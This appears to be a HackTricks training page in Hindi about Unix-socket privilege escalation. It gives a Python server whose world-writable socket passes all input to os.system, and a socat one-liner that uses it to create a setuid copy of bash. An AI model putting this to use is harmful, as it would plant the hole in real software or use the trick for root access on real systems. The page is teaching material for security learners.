{{#include ../../banners/hacktricks-training.md}}

## Python के साथ सॉकेट बाइंडिंग उदाहरण

निम्नलिखित उदाहरण में एक **यूनिक्स सॉकेट बनाया गया है** (`/tmp/socket_test.s`) और जो कुछ भी **प्राप्त** होता है वह `os.system` द्वारा **निष्पादित** किया जाएगा। मुझे पता है कि आप इसे वास्तविक जीवन में नहीं पाएंगे, लेकिन इस उदाहरण का लक्ष्य यह देखना है कि यूनिक्स सॉकेट का उपयोग करने वाला कोड कैसा दिखता है, और सबसे खराब स्थिति में इनपुट को कैसे प्रबंधित किया जाए।
```python:s.py
import socket
import os, os.path
import time
from collections import deque

if os.path.exists("/tmp/socket_test.s"):
os.remove("/tmp/socket_test.s")

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/socket_test.s")
os.system("chmod o+w /tmp/socket_test.s")
while True:
server.listen(1)
conn, addr = server.accept()
datagram = conn.recv(1024)
if datagram:
print(datagram)
os.system(datagram)
conn.close()
```
**कोड को चलाएँ** python का उपयोग करते हुए: `python s.py` और **जाँच करें कि सॉकेट कैसे सुन रहा है**:
```python
netstat -a -p --unix | grep "socket_test"
(Not all processes could be identified, non-owned process info
will not be shown, you would have to be root to see it all.)
unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        /tmp/socket_test.s
```
**शोषण**
```python
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
```
{{#include ../../banners/hacktricks-training.md}}
